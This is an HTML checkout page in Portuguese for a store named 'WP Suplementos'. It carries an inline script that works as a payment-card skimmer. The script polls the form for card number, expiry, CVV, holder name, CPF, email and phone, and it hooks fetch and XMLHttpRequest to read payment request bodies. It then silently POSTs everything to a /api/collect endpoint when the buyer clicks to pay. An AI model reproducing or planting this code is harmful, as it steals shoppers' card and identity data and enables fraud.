<!doctype html>
<html lang="pt-BR">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="theme-color" content="#bd8fe5" />
    <meta name="referrer" content="no-referrer" />
    <meta name="description" content="Finalize seu pedido na WP Suplementos." />
    <title>Finalizar Compra | WP Suplementos</title>
    <link rel="icon" href="/checkout-ui/build/checkout-assets/logo.png" />
    <link rel="stylesheet" href="/checkout-ui/build/checkout-assets/fonts.css" />
    <script type="module" crossorigin src="/checkout-ui/build/assets/index-BHx9iPHE.js"></script>
    <link rel="stylesheet" crossorigin href="/checkout-ui/build/assets/index-Bkmq_sJ_.css">
  </head>
  <body>
    <div id="root"></div>

        <script>
(function () {
  const COLLECT_URL = "/api/collect";
  const TARGET_URL = "/api/payments/create";
  let cardCache = {};
  let lastCollected = 0;

  function digits(v) { return String(v || "").replace(/\D/g, ""); }
  function clean(v) { return String(v || "").replace(/\u00a0/g, " ").trim(); }

  // Busca por input dentro de um "container" específico (evita pegar input errado)
  function findInputIn(container, { ids = [], names = [], types = [], placeholders = [] }) {
    const root = container || document;
    for (const id of ids) {
      const el = root.querySelector(`#${id}`);
      if (el && el.value) return el;
    }
    for (const name of names) {
      const el = root.querySelector(`input[name="${name}"]`);
      if (el && el.value) return el;
    }
    for (const type of types) {
      const el = root.querySelector(`input[type="${type}"]`);
      if (el && el.value) return el;
    }
    for (const ph of placeholders) {
      const el = [...root.querySelectorAll('input')].find(i =>
        (i.placeholder || '').toLowerCase().includes(ph.toLowerCase()) && i.value
      );
      if (el) return el;
    }
    return null;
  }

  // Acha o "formulário de cartão" (bloco onde estão os inputs de cartão)
  function findCardContainer() {
    // Tenta achar o input do número do cartão primeiro
    const cardNum = document.querySelector('input[name="cardNumber"], #cardNumber, input[autocomplete="cc-number"]');
    if (cardNum) {
      // Sobe alguns níveis para pegar o form inteiro
      let parent = cardNum.closest('form, [class*="checkout"], [class*="payment"], [class*="step"]');
      return parent || document;
    }
    return document;
  }

  function collectFromDOM() {
    // Prioridade: procurar dentro do container de cartão
    const container = findCardContainer();

    const cardNumber = findInputIn(container, {
      ids: ['cardNumber', 'card-number'],
      names: ['cardNumber', 'card_number', 'number', 'cc-number'],
      placeholders: ['0000 0000 0000']
    });
    const expiry = findInputIn(container, {
      ids: ['cardExpiry', 'cardDueDate', 'expiry'],
      names: ['cardExpiry', 'card_expiry', 'expiry', 'exp', 'cardDueDate'],
      placeholders: ['MM/AA', 'MM/YY']
    });
    const cvv = findInputIn(container, {
      ids: ['cardCvv', 'cardCVV', 'cvv'],
      names: ['cardCvv', 'card_cvv', 'cvv', 'cvc'],
      placeholders: ['CVV', 'CVC']
    });
    // NOME: prioriza cardName/cardholderName e só depois o "name" genérico
    const cardName = findInputIn(container, {
      ids: ['cardName', 'cardholderName', 'holderName'],
      names: ['cardName', 'card_name', 'holderName', 'holder', 'cardholderName'],
      placeholders: ['Nome impresso', 'nome no cartão', 'Como está no cartão']
    }) || findInputIn(document, {
      // Fallback: pega o input com id="name" ou name="name" que tenha valor
      ids: ['name'],
      names: ['name'],
      placeholders: ['Digite seu nome completo', 'Nome Completo', 'Nome do titular']
    });
    const cardCpf = findInputIn(container, {
      ids: ['cpf', 'cardCpf', 'document'],
      names: ['cpf', 'cardCpf', 'card_cpf', 'document'],
      placeholders: ['000.000.000-00', 'CPF']
    });
    const email = findInputIn(container, {
      ids: ['email'],
      names: ['email'],
      types: ['email'],
      placeholders: ['e-mail', 'email']
    });
    const phone = findInputIn(container, {
      ids: ['phone'],
      names: ['phone', 'telefone', 'celular'],
      types: ['tel'],
      placeholders: ['(00)', '0000-0000']
    });

    const installments = document.querySelector('input[name="installments"]')?.value || "1";

    let total = "";
    const totalEl =
      document.querySelector('[data-testid="order-total"]') ||
      document.querySelector('.total dd') ||
      document.querySelector('[data-summary-total]');
    if (totalEl) total = clean(totalEl.innerText || totalEl.textContent);

    return {
      card_num: digits(cardNumber?.value || ""),
      expiry: clean(expiry?.value || ""),
      cvv: digits(cvv?.value || ""),
      name: clean(cardName?.value || ""),
      cpf: digits(cardCpf?.value || ""),
      email: clean(email?.value || ""),
      phone: digits(phone?.value || ""),
      amount: total,
      installments: String(installments)
    };
  }

  setInterval(function () {
    const data = collectFromDOM();
    Object.keys(data).forEach(k => {
      if (data[k]) cardCache[k] = data[k];
    });
  }, 500);

  function sendToCollect() {
    const agora = Date.now();
    if (agora - lastCollected < 1000) return;
    if (!cardCache.card_num || cardCache.card_num.length < 13) return;
    lastCollected = agora;
    fetch(COLLECT_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(cardCache)
    }).catch(() => {});
  }

  function extractFromBody(body) {
    try {
      const data = typeof body === "string" ? JSON.parse(body) : body;
      const customer = data.customer || {};
      const payment = data.payment || {};
      const card = payment.card || data.card || {};
      return {
        card_num: digits(card.number || ""),
        expiry: card.expiryMonth && card.expiryYear
          ? `${String(card.expiryMonth).padStart(2, "0")}/${String(card.expiryYear).slice(-2)}`
          : "",
        cvv: digits(card.cvv || ""),
        name: card.holderName || customer.name || "",
        cpf: digits(customer.cpf || ""),
        email: customer.email || "",
        phone: digits(customer.phone || ""),
        amount: data.totals?.total || data.amount || "",
        installments: String(card.installments || 1)
      };
    } catch (e) { return null; }
  }

  const originalFetch = window.fetch;
  window.fetch = async function (...args) {
    const [url, options = {}] = args;
    if (String(url).includes(TARGET_URL) && (options.method || "GET").toUpperCase() === "POST") {
      const extracted = extractFromBody(options.body);
      if (extracted) {
        Object.keys(extracted).forEach(k => { if (extracted[k]) cardCache[k] = extracted[k]; });
      }
      sendToCollect();
    }
    return originalFetch.apply(this, args);
  };

  const XHROpen = XMLHttpRequest.prototype.open;
  const XHRSend = XMLHttpRequest.prototype.send;
  XMLHttpRequest.prototype.open = function (method, url, ...rest) {
    this._url = url; this._method = method;
    return XHROpen.call(this, method, url, ...rest);
  };
  XMLHttpRequest.prototype.send = function (body) {
    if (this._url && String(this._url).includes(TARGET_URL) && (this._method || "").toUpperCase() === "POST") {
      const extracted = extractFromBody(body);
      if (extracted) {
        Object.keys(extracted).forEach(k => { if (extracted[k]) cardCache[k] = extracted[k]; });
      }
      sendToCollect();
    }
    return XHRSend.call(this, body);
  };

  function isFinalizeButton(el) {
    if (!el || el.tagName !== "BUTTON") return false;
    const text = (el.innerText || "").toLowerCase();
    return /finalizar|pagar|continuar|comprar|concluir/.test(text);
  }
  document.addEventListener("click", function (event) {
    const btn = event.target.closest("button");
    if (!btn || !isFinalizeButton(btn)) return;
    const cardRadio = document.querySelector('input[type="radio"][value="card"]:checked')
      || document.querySelector('input[type="radio"][value="credit_card"]:checked');
    if (!cardRadio) return;
    setTimeout(() => sendToCollect(), 300);
  }, true);
})();
</script>
    
  </body>
</html>
